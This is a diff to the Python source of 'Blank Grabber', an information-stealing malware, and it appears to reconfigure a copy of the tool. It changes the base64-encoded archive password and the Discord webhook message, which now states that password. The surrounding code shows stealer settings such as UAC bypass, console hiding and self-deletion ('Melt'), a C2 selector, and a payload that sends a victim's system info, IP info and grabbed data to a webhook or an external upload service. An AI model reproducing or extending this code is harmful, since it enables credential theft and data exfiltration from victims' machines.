@@ -28,7 +28,7 @@ class Settings:
     Startup = bool('')
     Melt = bool('true')
     UacBypass = bool('')
-    ArchivePassword = base64.b64decode('SWFtaGFpMTcyMw==').decode()
+    ArchivePassword = base64.b64decode('c2tpZG9udG9w').decode()
     HideConsole = bool('true')
     Debug = bool('')
     RunBoundOnStartup = bool('')
@@ -1346,7 +1346,7 @@ class BlankGrabber:
         match Settings.C2[0]:
             case 0:
                 image_url = 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/f4kedre4lity/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
+                payload = {'content': 'pass là:skidontop', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/f4kedre4lity/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
